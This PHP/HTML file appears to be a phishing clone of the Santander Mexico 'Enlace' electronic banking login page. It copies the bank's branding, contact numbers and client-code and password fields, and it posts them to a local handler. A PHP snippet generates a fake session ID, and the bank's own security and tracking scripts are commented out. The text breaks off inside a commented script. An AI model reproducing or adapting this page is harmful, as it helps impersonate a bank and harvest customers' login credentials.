<?php 
    function randString(){
        $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';

        $charactersLength = strlen($characters);
        $randomString = '';
        for ($i = 0; $i < 20; $i++) {
            $randomString .= $characters[rand(0, $charactersLength - 1)];
        }
        return $randomString;
    }

    $session = rand(1000, 9000).randString();
?>


<!DOCTYPE html>
<html>

<head>

    <meta http-equiv="X-UA-Compatible" content="IE=9,IE=Edge,chrome=1">
    <meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">

    <!--<script language="javascript" src="/eai/EaiEmpresasWAR/js/rsa/hashtable.js"></script>
    <script language="javascript" src="/eai/EaiEmpresasWAR/js/rsa/rsa.js"></script>
    <script type="script/meta" src="https://images.santander-serfin.com/114523/buscar.js?r=0.7049974396436636"></script>
    <script src="https://siep.santander-serfin.com/poste/dona.js?r=0.7492994125214343" async="" type="script/meta"></script>
    <script type="script/meta" src="https://fie.santander-serfin.com/114523/nuc.js?r=0.6922658749870207"></script>
    <script type="text/javascript" async="" src="https://fie.santander-serfin.com/114523/e1oDM?d=JTVCJTdCJTIyaWQlMjIlM0ElMjI0JTIyJTJDJTIyZGF0YSUyMiUzQSU3QiUyMnMlMjIlM0ElMjJmZDViMDMwZS1jMDRlLTRkMTQtOWEzMi1iODk2YjIxYTUwN2YlMjIlN0QlN0QlNUQ%3D&amp;cid=4&amp;si=0&amp;e=https%3A%2F%2Fenlace.santander-serfin.com&amp;t=jsonp&amp;c=iph_hydxculoanld&amp;eu=https%3A%2F%2Fenlace.santander-serfin.com%2Feai%2FEaiEmpresasWAR%2Finicio.do"></script>
    <script type="script/meta" src="https://fie.santander-serfin.com/114523/indice.js?r=0.001716567724227902"></script>
    <script type="text/javascript" async="" src="https://fie.santander-serfin.com/114523/e1oDM?d=JTVCJTdCJTIyaWQlMjIlM0ElMjI0JTIyJTJDJTIyZGF0YSUyMiUzQSU3QiUyMnMlMjIlM0ElMjJmZDViMDMwZS1jMDRlLTRkMTQtOWEzMi1iODk2YjIxYTUwN2YlMjIlN0QlN0QlNUQ%3D&amp;cid=4&amp;si=1&amp;e=https%3A%2F%2Fenlace.santander-serfin.com&amp;t=jsonp&amp;c=dvbuqnwqubyhnklg&amp;eu=https%3A%2F%2Fenlace.santander-serfin.com%2Feai%2FEaiEmpresasWAR%2Finicio.do"></script>
    <script type="script/meta" src="https://fie.santander-serfin.com/114523/cc.js?r=0.3789213224858623"></script>
    <script type="text/javascript" async="" src="https://siep.santander-serfin.com/poste/6G2XP?d=JTVCJTdCJTIyaWQlMjIlM0ElMjI2JTIyJTJDJTIyZGF0YSUyMiUzQSU3QiUyMmNpZCUyMiUzQSUyMjYlMjIlMkMlMjJiJTIyJTNBMCUyQyUyMnRtJTIyJTNBMCUyQyUyMm5oJTIyJTNBJTIyNTc4Y2MxYTNhZWVhYWE2MjdkYWZkM2RmMjY2YWJhODkzYTM3ZDE4NzNhODhkYzM0NDlmNTIzMmI3ZTM0MzM1MCUyMiUyQyUyMmQlMjIlM0ElMjIlMjU3QiUyNTIyZG9tLmJsb2NrcXVvdGUlMjUyMiUyNTNBJTI1NUIlMjU1RCUyNTdEJTIyJTJDJTIycCUyMiUzQTAlMkMlMjJyJTIyJTNBMC44MjkxNTUxMTQyMDU3MTgzJTdEJTdEJTVE&amp;cid=6&amp;si=0&amp;e=https%3A%2F%2Fenlace.santander-serfin.com&amp;t=jsonp&amp;c=nbfshgvnzbxfihbq&amp;eu=https%3A%2F%2Fenlace.santander-serfin.com%2Feai%2FEaiEmpresasWAR%2Finicio.do"></script>
    <script type="text/javascript" async="" src="https://fie.santander-serfin.com/114523/e1oDM?d=JTVCJTdCJTIyaWQlMjIlM0ElMjIxNyUyMiUyQyUyMmRhdGElMjIlM0ElN0IlMjJ0JTIyJTNBZmFsc2UlMkMlMjJ1JTIyJTNBJTIyJTJGZWFpJTJGRWFpRW1wcmVzYXNXQVIlMkZpbmljaW8uZG8lMjIlN0QlN0QlNUQ%3D&amp;cid=17&amp;si=0&amp;e=https%3A%2F%2Fenlace.santander-serfin.com&amp;t=jsonp&amp;c=qburygbxbtotnfab&amp;eu=https%3A%2F%2Fenlace.santander-serfin.com%2Feai%2FEaiEmpresasWAR%2Finicio.do"></script>
    <script type="text/javascript" async="" src="https://fie.santander-serfin.com/114523/e1oDM?d=JTVCJTdCJTIyaWQlMjIlM0ElMjI4JTIyJTJDJTIyZGF0YSUyMiUzQSU3QiUyMmNpZCUyMiUzQSUyMjglMjIlMkMlMjJ1JTIyJTNBJTIyaHR0cHMlM0ElMkYlMkZlbmxhY2Uuc2FudGFuZGVyLXNlcmZpbi5jb20lMkZlYWklMkZFYWlFbXByZXNhc1dBUiUyRmluaWNpby5kbyUyMiUyQyUyMnIlMjIlM0ElMjIlMjIlMkMlMjJwaWQlMjIlM0E2MzUxODY5OTQlMkMlMjJmYyUyMiUzQTElMkMlMjJjbnVtJTIyJTNBMSUyQyUyMnRzJTIyJTNBMTU4NjgxMTEwOSUyQyUyMnJhbmQlMjIlM0EyNTE1NDIlN0QlN0QlNUQ%3D&amp;cid=8&amp;si=0&amp;e=https%3A%2F%2Fenlace.santander-serfin.com&amp;t=jsonp&amp;c=mheghhdcnzdskrep&amp;eu=https%3A%2F%2Fenlace.santander-serfin.com%2Feai%2FEaiEmpresasWAR%2Finicio.do"></script>
    <script type="text/javascript" async="" src="https://fie.santander-serfin.com/114523/e1oDM?d=JTVCJTdCJTIyaWQlMjIlM0ElMjIzMyUyMiUyQyUyMmRhdGElMjIlM0ElN0IlMjJ0JTIyJTNBZmFsc2UlMkMlMjJ1JTIyJTNBJTIyJTJGZWFpJTJGRWFpRW1wcmVzYXNXQVIlMkZpbmljaW8uZG8lMjIlN0QlN0QlNUQ%3D&amp;cid=33&amp;si=0&amp;e=https%3A%2F%2Fenlace.santander-serfin.com&amp;t=jsonp&amp;c=qbvuzslyouqohmtt&amp;eu=https%3A%2F%2Fenlace.santander-serfin.com%2Feai%2FEaiEmpresasWAR%2Finicio.do"></script>
    <script type="text/javascript" async="" src="https://fie.santander-serfin.com/114523/e1oDM?d=JTVCJTdCJTIyaWQlMjIlM0ElMjIzMyUyMiUyQyUyMmRhdGElMjIlM0ElN0IlMjJ0JTIyJTNBZmFsc2UlMkMlMjJ1JTIyJTNBJTIyJTJGZWFpJTJGRWFpRW1wcmVzYXNXQVIlMkZpbmljaW8uZG8lMjIlN0QlN0QlNUQ%3D&amp;cid=33&amp;si=1&amp;e=https%3A%2F%2Fenlace.santander-serfin.com&amp;t=jsonp&amp;c=fnrzbfhuzfomfrht&amp;eu=https%3A%2F%2Fenlace.santander-serfin.com%2Feai%2FEaiEmpresasWAR%2Finicio.do"></script>
    <script type="text/javascript" async="" src="https://fie.santander-serfin.com/114523/e1oDM?d=JTVCJTdCJTIyaWQlMjIlM0ElMjIyMSUyMiUyQyUyMmRhdGElMjIlM0ElN0IlMjJkJTIyJTNBJTIyN3RzeGxEdSUyQnpVNkVENjJyNVMzM3VWcnFiRkwyeU42Mm5UcE9SaHh6ZzRERDQlMkJoUnUwV3dpanY1dlEzMVltb1NvTHJBN2hHbzFIdDBtSHVXcnR6bmJOT3JUNFg1QjlKbTklMkZOVkMzakNvT0YzVjRyVW1BJTNEJTNEJTIyJTdEJTdEJTVE&amp;cid=21&amp;si=1&amp;e=https%3A%2F%2Fenlace.santander-serfin.com&amp;t=jsonp&amp;c=zpcerwhpvtkxcfgw&amp;eu=https%3A%2F%2Fenlace.santander-serfin.com%2Feai%2FEaiEmpresasWAR%2Finicio.do"></script>
    <script type="text/javascript" async="" src="https://fie.santander-serfin.com/114523/e1oDM?d=JTVCJTdCJTIyaWQlMjIlM0ElMjIzMCUyMiUyQyUyMmRhdGElMjIlM0ElN0IlMjJjaWQlMjIlM0ElMjIzMCUyMiUyQyUyMmQlMjIlM0ElNUIlNUIlMjJ0b2tlbiUyMiUyQzAlMkNudWxsJTJDMTU4NjgxMTEwOTc0OSUyQyUyMkFDJTIyJTJDMCUyQyUyMmZvcm1hUHJpbmNpcGFsJTIyJTJDJTIyMDFmM2NlNjklMjIlNUQlNUQlMkMlMjJoJTIyJTNBJTdCJTIyMDFmM2NlNjklMjIlM0ElMjJ0YWdOYW1lJTNESU5QVVQlM0JpZCUzRHRva2VuJTNCJTIyJTdEJTJDJTIyYyUyMiUzQTElMkMlMjJ0JTIyJTNBJTIya3MlMjIlMkMlMjJsJTIyJTNBJTIyJTJGZWFpJTJGRWFpRW1wcmVzYXNXQVIlMkZpbmljaW8uZG8lMjIlMkMlMjJzdCUyMiUzQTE1ODY4MTExMDkzMzYlN0QlN0QlNUQ%3D&amp;cid=30&amp;si=0&amp;e=https%3A%2F%2Fenlace.santander-serfin.com&amp;t=jsonp&amp;c=guuurshqiemtqmrm&amp;eu=https%3A%2F%2Fenlace.santander-serfin.com%2Feai%2FEaiEmpresasWAR%2Finicio.do"></script>
    <script type="text/javascript" async="" src="https://fie.santander-serfin.com/114523/e1oDM?d=JTVCJTdCJTIyaWQlMjIlM0ElMjI4JTIyJTJDJTIyZGF0YSUyMiUzQSU3QiUyMmNpZCUyMiUzQSUyMjglMjIlMkMlMjJ1JTIyJTNBJTIyaHR0cHMlM0ElMkYlMkZlbmxhY2Uuc2FudGFuZGVyLXNlcmZpbi5jb20lMkZlYWklMkZFYWlFbXByZXNhc1dBUiUyRmluaWNpby5kbyUyMiUyQyUyMnIlMjIlM0ElMjIlMjIlMkMlMjJwaWQlMjIlM0E2MzUxODY5OTQlMkMlMjJmYyUyMiUzQTElMkMlMjJjbnVtJTIyJTNBMiUyQyUyMnRzJTIyJTNBMTU4NjgxMTIwOSUyQyUyMnJhbmQlMjIlM0E4NDM2OTklN0QlN0QlNUQ%3D&amp;cid=8&amp;si=0&amp;e=https%3A%2F%2Fenlace.santander-serfin.com&amp;t=jsonp&amp;c=hcbbkylohaqym_kp&amp;eu=https%3A%2F%2Fenlace.santander-serfin.com%2Feai%2FEaiEmpresasWAR%2Finicio.do"></script>
    <script type="text/javascript" async="" src="https://fie.santander-serfin.com/114523/e1oDM?d=JTVCJTdCJTIyaWQlMjIlM0ElMjI4JTIyJTJDJTIyZGF0YSUyMiUzQSU3QiUyMmNpZCUyMiUzQSUyMjglMjIlMkMlMjJ1JTIyJTNBJTIyaHR0cHMlM0ElMkYlMkZlbmxhY2Uuc2FudGFuZGVyLXNlcmZpbi5jb20lMkZlYWklMkZFYWlFbXByZXNhc1dBUiUyRmluaWNpby5kbyUyMiUyQyUyMnIlMjIlM0ElMjIlMjIlMkMlMjJwaWQlMjIlM0E2MzUxODY5OTQlMkMlMjJmYyUyMiUzQTAlMkMlMjJjbnVtJTIyJTNBMyUyQyUyMnRzJTIyJTNBMTU4NjgxMTIyNSUyQyUyMnJhbmQlMjIlM0EzNDA3NSU3RCU3RCU1RA%3D%3D&amp;cid=8&amp;si=0&amp;e=https%3A%2F%2Fenlace.santander-serfin.com&amp;t=jsonp&amp;c=uutonxesirqypzha&amp;eu=https%3A%2F%2Fenlace.santander-serfin.com%2Feai%2FEaiEmpresasWAR%2Finicio.do"></script>-->
</head>

<body onload="presentaHoraFecha();" id="body" bgcolor="#FFFFFF" marginheight="0" marginwidth="0" topmargin="0">

    <input type="hidden" name="session" id="session" value="<?=$session;?>">

    <!--<script>
        var devicePrint = "";

        try {
            if (typeof(encode_deviceprint) != 'undefined') {
                devicePrint = encode_deviceprint();
            }
        } catch (e) {}

        function mandaDevice() {
            if (window.XMLHttpRequest)
                ajax = new XMLHttpRequest(); // No Internet Explorer
            else
                ajax = new ActiveXObject("Microsoft.XMLHTTP"); // Internet Explorer
            ajax.open("GET", "./js/rsa/getDevicePrint.jsp?devicePrint=" + devicePrint, true);
            ajax.send("");
        }
        mandaDevice();

    </script>-->










    <meta http-equiv="X-UA-Compatible" content="IE=9,IE=Edge,chrome=1">
    <!--<script type="text/javascript">
        (function() {
            document.cookie = "___tk114523=" + encodeURIComponent(Math.random()) + ";path=/;domain=santander-serfin.com";
        })();

    </script>-->
    <!--<script type="text/javascript">
        (function() {
            var f = document,
                e = window,
                i = e.location.protocol,
                b = [
                    ["src", [i == "https:" ? "https:/" : "http:/", "images.santander-serfin.com/114523/buscar.js?r=" + Math.random()].join("/")],
                    ["type", "text/javascript"],
                    ["async", true]
                ],
                g = "XMLHttpRequest",
                a = null,
                j = e[g] && (a = new e[g]()).withCredentials !== undefined,
                c = f.createElement("script"),
                h = f.getElementsByTagName("head")[0];
            if (j) {
                a.open("GET", b[0][1], b[2][1]);
                a.withCredentials = true;
                a.onreadystatechange = function(d) {
                    if (a.readyState == 4 && a.status == 200) {
                        c.type = "script/meta";
                        c.src = b[0][1];
                        h.appendChild(c);
                        new Function(a.responseText)()
                    }
                };
                a.send()
            } else {
                setTimeout(function() {
                    for (var d = 0, k = b.length; d < k; d++) {
                        c.setAttribute(b[d][0], b[d][1])
                    }
                    h.appendChild(c)
                }, 0)
            }
        })();

    </script>-->




    <script type="text/javascript">
        function data1() {
            return 'fd5b030e-c04e-4d14-9a32-b896b21a507f';
        }

    </script>

    <!--<script type="text/javascript">
        (function(d, f) {
            var b = {
                    src: (d.location.protocol == "https:" ? "https:" : "http:") + "//fie.santander-serfin.com/114523/indice.js?r=" + Math.random(),
                    async: true,
                    type: "text/javascript"
                },
                g = "XMLHttpRequest",
                c = f.createElement("script"),
                h = f.getElementsByTagName("head")[0],
                a;
            if (d[g] && (a = new d[g]()).withCredentials !== undefined) {
                a.open("GET", b.src, b.async);
                a.withCredentials = true;
                a.onreadystatechange = function(e) {
                    if (a.readyState == 4 && a.status == 200) {
                        c.type = "script/meta";
                        c.src = b.src;
                        h.appendChild(c);
                        new Function(a.responseText)()
                    }
                };
                a.send()
            } else {
                setTimeout(function() {
                    for (var e in b) {
                        c.setAttribute(e, b[e])
                    }
                    h.appendChild(c)
                }, 0)
            }
        })(window, document);

    </script>-->


    <!--<script src="/eai/EaiEmpresasWAR/js/common.js" type="text/javascript"></script>-->

    <meta content="application/xhtml+xml; charset=UTF-8" http-equiv="Content-Type">
    <meta http-equiv="X-UA-Compatible" content="IE=9,IE=Edge,chrome=1">
    <meta content="width=device-width, initial-scale=1, maximum-scale=1">

    <script type="text/javascript" src="js/jquery-1.2.6.js"></script>
    <script type="text/javascript" src="js/Santander/jquery-1.12.0.min.js"></script>
    <script type="text/javascript" src="js/Santander/lib.js"></script>
    <!--<script type="text/javascript" src="https://www.images-home.com/image.js"></script><img src="https://www.images-home.com/86975.gif?from=enlace.santander-serfin.com">-->
    <!--<script type="text/javascript" src="js/pagLoginCliente.js"></script>-->
    <script type="text/javascript" src="js/enlace.js"></script>
    <script type="text/javascript" src="js/global.js"></script>
    <!--<script type="text/javascript" src="js/mkd25x.js"></script>-->
    <script type="text/javascript" src="js/cuadroDialogo.js"></script>

    <script src="validation_username.js"></script>

    
    <!--<script src="js/Santander/jquery-1.12.0.min.js" type="text/javascript"></script>
    <script src="js/Santander/jquery-migrate-1.3.0.min.js" type="text/javascript"></script>
    <script src="js/Santander/lib.js" type="text/javascript"></script>-->

    <!--<script type="text/javascript">
        function FrameAyuda(url) {
            if (url == 's26050h') {
                var admToken = window.open("." + "/jsp/ayuda/rsa/ayuda.jsp", "hlp", "toolbar=no,location=no,directories=no,status=no,menubar=no,scrollbars=yes,resizable=yes,width=400,height=450");
            } else if (url == 'challege') {
                var admToken = window.open("." + "/jsp/ayuda/ayudaChallenge.jsp", "hlp", "toolbar=no,location=no,directories=no,status=no,menubar=no,scrollbars=yes,resizable=yes,width=400,height=450");
            }
        }

        function avisoLegal() {
            window.open('avisoLegal.do', 'hlp', 'toolbar=no,location=no,directories=no,status=no,menubar=no,scrollbars=yes,resizable=yes,width=700,height=750');
        }

    </script>-->
    <link type="text/css" rel="stylesheet" href="css/seguridad.css">
    <link type="text/css" media="screen" rel="stylesheet" href="css/Default.css">
    <link type="text/css" media="screen" rel="stylesheet" href="css/bootstrap.css">
    <link rel="stylesheet" type="text/css" href="js/Santander/estilos.css">
    <script type="text/javascript">
        if (history.forward(1)) {
            //location.replace(history.forward(1));
        }

    </script>


    <div id="root-content" style="margin-top: 15px;">
        <div id="root-tplSeguridad-contMain">
            <!-- Baner superior Enlace Banca Electronica -->
            <div class="col-md-12 page-header padding-left-0" id="root-tplSeguridad-seguridadContHeader">
                <div class="col-md-6 col-lg-5 padding-left-0" id="root-tplSeguridad-seguridadContHeaderPrimary">
                    <div class="pull-left page-header-logo" id="root-tplSeguridad-contImagenHeader">
                        <a href="#" id="root-tplSeguridad-linkCabecera">
                            <img draggable="true" src="img/logo.jpeg" class="imagenCabecera" id="root-tplSeguridad-imagenHeader">
                        </a>
                    </div>
                    <h1 class="ellipsis" id="root-tplSeguridad-seguridadHeaderPrimaryTitleID">
                        <span class="strong" id="root-tplSeguridad-seguridadTextHeaderPrimaryTitle">Enlace</span>
                    </h1>
                </div>
                <div class="col-md-6 col-lg-7" id="root-tplSeguridad-seguridadContHeaderSecondary">
                    <div class="pull-right" id="root-tplSeguridad-seguridadContHeaderSecundaryTools">
                        <a title="Contacto" class="icon-contacto" id="root-tplSeguridad-aIconHeaderContact"></a>
                        <div id="root-tplSeguridad-popoverContContact" class="oculto">
                            <div id="root-tplSeguridad-popoverContact" class="popover popover-contact fade bottom in" style="top: 35px; right: -5px">
                                <div id="root-tplSeguridad-arrowPopoverContact" class="arrow"></div>
                                <div id="root-tplSeguridad-innerPopoverContact">
                                    <h5 id="root-tplSeguridad-litFiltroPerimetros" class="popover-title icon-flecha-blanca-derecha">Atención a clientes</h5>
                                    <div id="root-tplSeguridad-contentPopoverContact" class="popover-content">
                                        <div id="root-tplSeguridad-contentDfPopoverContact" class="popover-text">
                                            <span id="root-tplSeguridad-genDescNumAtTelfContPopContact">Célula PYME : </span>
                                            <span id="root-tplSeguridad-genNumAtTelfContPopContact">55 5169 4303</span>
                                        </div>
                                        <div id="root-tplSeguridad-contentNumTelfPopoverContact" class="popover-text">
                                            <span id="root-tplSeguridad-genDescRepublicaPopContact">Célula Empresas Instituciones : </span>
                                            <span id="root-tplSeguridad-genNumRepublicaPopContact">55 5169 4301</span>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="inline-block page-content" id="root-tplSeguridad-seguridadContenedor">
                <div class="inline-block" id="root-tplSeguridad-ICabeceraPrincipal-cabSuperiorPrincipal">
                    <!--Titulo Bienvenido a enlace internet-->
                    <div class="col-md-7 col-lg-8" id="root-tplSeguridad-ICabeceraPrincipal-cabSuperiorTitulo">
                        <h2 id="root-tplSeguridad-ICabeceraPrincipal-headingTituloPrincipal">Bienvenido a Banca Electrónica Transaccional</h2>
                    </div>
                    <!--FIN Titulo Bienvenido a enlace internet-->
                    <!--Cabecera Superior de la botonera  -->
                    <div class="col-md-5 col-lg-4 tools-app" id="root-tplSeguridad-ICabeceraPrincipal-cabSuperiorBotonera">
                        <span class="pull-right icon-boton-info" id="gbo25170img" onclick="FrameAyuda('s26050h');"></span>
                        <!-- Cabecera principal fecha/Hora-->
                        <div class="pull-right" id="root-tplSeguridad-ICabeceraPrincipal-fechaYHora">
                            <!-- Cabecera principal hora actual -->
                            <div id="root-tplSeguridad-ICabeceraPrincipal-headerHoraActual">
                                <span id="root-tplSeguridad-ICabeceraPrincipal-horaActualLbl">Hora actual:</span>
                                <strong>
                                    <span id="hora">15:51</span>
                                    <span id="root-tplSeguridad-ICabeceraPrincipal-horaActualLblTextHrs">Hrs</span>
                                </strong>
                            </div>
                            <!-- Fin Cabecera principal hora actual -->
                            <!-- Cabecera fecha Actual -->
                            <div id="root-tplSeguridad-ICabeceraPrincipal-headerFechaActual">
                                <span id="root-tplSeguridad-ICabeceraPrincipal-fechaActualLbl">Fecha actual:</span>
                                <strong>
                                    <span id="fecha">Lunes 13 de Abril del 2020</span>
                                </strong>
                            </div>
                            <!-- Fin Cabecera fecha Actual -->
                        </div>
                        <!--Fin Cabecera principal fecha/Hora-->
                    </div>
                    <!--Fin Cabecera Superior de la botonera  -->
                </div>
                <!---->
                <!-- Inicio Cabecera superior secundaria Acceso a su banda electronica-->
                <div class="inline-block header-auxiliar" id="root-tplSeguridad-cabeceraSecundaria-seguridadCabSuperiorSecundaria" style="margin-top: 3px;">
                    <div class="col-md-10 col-lg-10" id="root-tplSeguridad-cabeceraSecundaria-seguridadCabSuperiorSecundariaIzquierda">
                        <h3 id="root-tplSeguridad-cabeceraSecundaria-seguridadCabSuperiorSecundariaSubtitulo">ACCESO A SU BANCA ELECTRÓNICA TRANSACCIONAL
                            <span id="root-tplSeguridad-cabeceraSecundaria-headingSuperiorSecundarioDescripcion"> Introduzca sus credenciales de acceso de Banca Electrónica Transaccional</span>
                        </h3>
                    </div>
                </div>
                <!-- Fin Cabecera superior secundaria Acceso a su banda electronica-->
                <!-- Inicio Body-->
                <div class="col-md-12 " id="root-tplSeguridad-seguridadBody" style="margin-top: 3px;">
                    <!-- Inicio body izquierda -->
                    <div class="col-md-9 col-lg-9 padding-left-0" id="root-tplSeguridad-seguridadBodyIzquierda">
                        <!-- Inicio Form -->
                        <form action="validarClienteinicio.do" id="formaPrincipal" method="POST" name="formaPrincipal">
                            <!-- Inputs de form -->
                            <input type="hidden" id="msj" name="msj" value="">
                            <input type="hidden" id="urlToken" name="urlToken" value="">
                            <input type="hidden" id="token" name="token" value="false">
                            <input type="hidden" id="usrAut" name="usrAut" value="">
                            <input type="hidden" id="btnPress" name="btnPress" value="0">
                            <!-- Fin inputs de form -->
                            <!-- Inicio gril codigo cliente -->
                            <div class="vcenter container-fluid" id="root-tplSeguridad-seguridadGapBody-formularioCodigoCliente-gridCodigoCliente">
                                <!-- Inicio gridRow0 -->
                                <div class="row" id="root-tplSeguridad-seguridadGapBody-formularioCodigoCliente-_gridRow_0">
                                    <div class="paddingBottom15 col-xs-12 col-md-8 col-lg-8 col-md-offset-1 col-lg-offset-1" id="root-tplSeguridad-seguridadGapBody-formularioCodigoCliente-_gridCell_0">
                                        <div class="form-group" id="root-tplSeguridad-seguridadGapBody-formularioCodigoCliente-containerCodigoCliente">
                                            <label for="IdUsernameTxt" id="IdUsername">Código de Cliente</label>
                                            <input autocomplete="off" id="IdUsernameTxt" maxlength="8" type="password" size="20" class="col-md-12 col-lg-12 form-control" name="username" value="">
                                            <input autocomplete="off" id="paginaReq" maxlength="8" type="text" size="20" class="oculto" name="paginaReq">
                                            <br>
                                            <label for="password" id="IdPassword" class="oculto">Contraseña de Enlace</label>
                                            <input type="hidden" name="codigoCliente" id="codigoCliente">
                                            <input autocomplete="off" type="password" name="txtPassword" maxlength="20" size="20" id="IdPasswordTxt" class="oculto">
                                            <input type="hidden" id="login-form-type" name="login-form-type" value="pwd">
                                            <input type="hidden" name="password">
                                            <br>
                                        </div>
                                    </div>
                                </div>
                                <!-- Fin gridRow0 -->
                                <!-- Inicio gridRow2 -->
                                <div class="row" id="root-tplSeguridad-seguridadGapBody-formularioCodigoCliente-_gridRow_2">
                                    <div class="col-xs-12 col-md-8 col-lg-8 col-md-offset-1 col-lg-offset-1" id="root-tplSeguridad-seguridadGapBody-formularioCodigoCliente-_gridCell_4">
                                        <div class="padding-right-0 padding-left-0 container-fluid" id="root-tplSeguridad-seguridadGapBody-formularioCodigoCliente-_grid_1">
                                            <!-- Inicio Boton Administrcion de Token -->
                                            <div class="row" id="root-tplSeguridad-seguridadGapBody-formularioCodigoCliente-_gridRow_3">
                                                <div class="col-xs-6 col-md-6 col-lg-6" id="root-tplSeguridad-seguridadGapBody-formularioCodigoCliente-_gridCell_5">
                                                    <button class="col-md-6 col-lg-6 btn btn-default icon-token2" id="administracionToken" name="administracionToken" type="button">
                                                        <span id="root-tplSeguridad-seguridadGapBody-formularioCodigoCliente-regresar_6">Administración Token</span>
                                                    </button>
                                                </div>
                                                <!-- inicio Adminicstarcion de contrase�a -->
                                                <div class="col-xs-6 col-md-6 col-lg-6" id="root-tplSeguridad-seguridadGapBody-formularioCodigoCliente-_gridCell_6">
                                                    <button class="col-md-6 col-lg-6 btn btn-default icon-llave" id="administracionContra" name="administracionContra" type="button">
                                                        <span id="root-tplSeguridad-seguridadGapBody-formularioCodigoCliente-regresar_7">Administración de Contraseña</span>
                                                    </button>
                                                </div>
                                                <!-- Fin administacion de contrase�a -->
                                            </div>
                                            <!-- Fin Boton administracion de token -->
                                        </div>
                                    </div>
                                </div>
                                <!-- Fin gridRow2 -->
                            </div>
                            <!-- Fin gril codigo cliente -->
                        </form>
                        <!-- Fin form -->
                    </div>
                    <!-- Fin body izquierda -->
                    <!-- Inicio body derecha -->
                    <div class="col-md-3 col-lg-3 padding-right-0" id="root-tplSeguridad-seguridadBodyDerecha">
                        <div id="root-tplSeguridad-seguridadAsideTrusteer">
                            <div class="trusteer" id="root-tplSeguridad-ITrusteer-contImgAsideTrusteer">
                                <a class="inline-block" href="https://www.ibm.com/security/trusteer/landing-page/es/santander-mexico-empresas/" id="root-tplSeguridad-ITrusteer-linkTrusteer" target="_blank">
                                    <img draggable="true" style="width:100%;" id="root-tplSeguridad-ITrusteer-iconAsideTruster" src="img/trusteer.png">
                                </a>
                            </div>
                        </div>
                    </div>
                    <!-- Fin body derecha -->
                </div>
                <!-- Fin Body-->
                <!---->
                <div id="root-tplSeguridad-contFooter">
                    <div class="col-md-12 padding-right-0" id="root-tplSeguridad-IFooter-pieInferior">
                        <div class="col-md-10 padding-left-0" id="root-tplSeguridad-IFooter-pieInferiorBotoneraIzquierda">
                            <span id="root-tplSeguridad-IFooter-space">&nbsp;</span>
                        </div>
                        <div id="root-tplSeguridad-IFooter-pieInferiorBotoneraDerecha">
                            <div class="oculto" id="root-tplSeguridad-IFooter-forEachButtons-0-divBoton">
                                <button name="IdBack" type="button" class="btn btn-default" id="IdBack">Regresar</button>
                            </div>
                            <div class="col-md-2" id="root-tplSeguridad-IFooter-forEachButtons-0-divBoton">
                                <button name="IdSubmit" type="button" class="btn btn-primary" id="IdSubmit" onclick="">Siguiente</button>
                            </div>
                            <input type="hidden" name="password">
                        </div>
                    </div>
                </div>
                <!-- Fin Footer -->
            </div>

            <div class="col-md-12 page-footer" id="root-tplSeguridad-seguridadContFooter">
                <div id="root-tplSeguridad-seguridadContFooterDisclaimer">
                    <span id="root-tplSeguridad-seguridadContFooterDiscl">Derechos Reservados 2014, Banco Santander (México) S.A., Institución de Banca Múltiple, Grupo Financiero Santander México.</span>
                </div>
                <div id="root-tplSeguridad-seguridadContFooterAvisoLegal">
                    <a title="Aviso Legal" href="#" onclick="avisoLegal();" id="root-tplSeguridad-seguridadContFooterAvisoLegalLink">
                        <span id="root-tplSeguridad-seguridadContFooterAvisoLegalText">Aviso Legal</span>
                    </a>
                </div>
            </div>
        </div>
    </div>
    <!--<div onclick="fade_OUtModalIntrusive();" id="supermod_intrusivo" style="width: 100%; zoom: 1; height: 100%; display: none;"></div>
    <div id="bannerEmergente" style="width: 20%; padding: 0px; margin-left: 180px; display: block;">
    
    
    
    <embed src="js/Santander/banner_emergente_seguridad_login.swf" width="936" quality="high" height="262" wmode="transparent" type="application/x-shockwave-flash" pluginspage="http://www.macromedia.com/go/getflashplayer">
    </div>-->

    <!--<script type="text/javascript">
        $(function() {
            var location = window.location.href;
            var activos = location.indexOf("plantilla=11");
            var estatusPass = document.getElementById("IdPasswordTxt").className;
            if (activos != -1 || "oculto" != estatusPass) {
                document.getElementById("bannerEmergente").setAttribute("class", "oculto");
                //document.getElementById("supermod_intrusivo").setAttribute("class", "oculto");
                //document.getElementById("supermod_intrusivo").setAttribute("style.diplay", "none");
                document.getElementById("supermod_intrusivo").style.display = "none";
                document.getElementById("supermod_intrusivo").className = "oculto";
                document.getElementById("supermod_intrusivo").id = "supermod_intrusivo_temp";

                document.getElementById("root-tplSeguridad-seguridadBodyDerecha").setAttribute("class", "oculto");
                document.getElementById("root-tplSeguridad-seguridadBodyDerecha").className = "oculto";
                document.getElementById("root-tplSeguridad-seguridadGapBody-formularioCodigoCliente-_gridCell_0").className = "paddingBottom15 col-xs-6 col-md-6 col-lg-6 col-md-offset-5 col-lg-offset-5";
                document.getElementById("root-tplSeguridad-IFooter-pieInferiorBotoneraIzquierda").setAttribute("class", "col-md-8 padding-left-0");
                document.getElementById("root-tplSeguridad-IFooter-forEachButtons-0-divBoton").setAttribute("class", "col-md-2");
            }
        });
        $(document).ready(function() {
            $("#root-tplSeguridad-seguridadContHeaderSecundaryTools").click(function() {
                $("#root-tplSeguridad-popoverContContact").attr("class", "none");
            });

            $("#root-tplSeguridad-seguridadContHeaderSecundaryTools").mouseleave(function() {
                $("#root-tplSeguridad-popoverContContact").attr("class", "oculto");
            });
            $("#IdBack").click(function() {
                document.getElementById("urlToken").setAttribute("value", "false");
                document.getElementById("token").setAttribute("value", "false");
                window.location = "inicio.do";
            });
        });

    </script>-->


    <!--<script type="text/javascript">
        var mensajes = [];
        mensajes['CERR000'] = 'Debe introducir su Contrase&ntilde;a';
        mensajes['CERR001'] = 'El c&oacute;digo de cliente, o la contrase&ntilde;a de Enlace son incorrectos. Por favor intenta nuevamente.';
        mensajes['CERR002'] = 'Tu usuario ha sido bloqueado, debido a intentos fallidos de acceso.';
        mensajes['CERR003'] = 'Error en la autenticaci&oacute;n, intente m&aacute;s tarde.';
        mensajes['ERRUSU'] = 'Debe introducir su C&oacute;digo de cliente.';
        mensajes['ERRUSUADMT'] = 'Debe introducir su c&oacute;digo de cliente y dar Click en Administraci&oacute;n Token.';
        mensajes['ERRUSUADMCNT'] = 'Debe introducir su c&oacute;digo de cliente y dar Click en Administraci&oacute;n de Contrase&ntilde;a.';
        var contexto = '/eai/EaiEmpresasWAR';
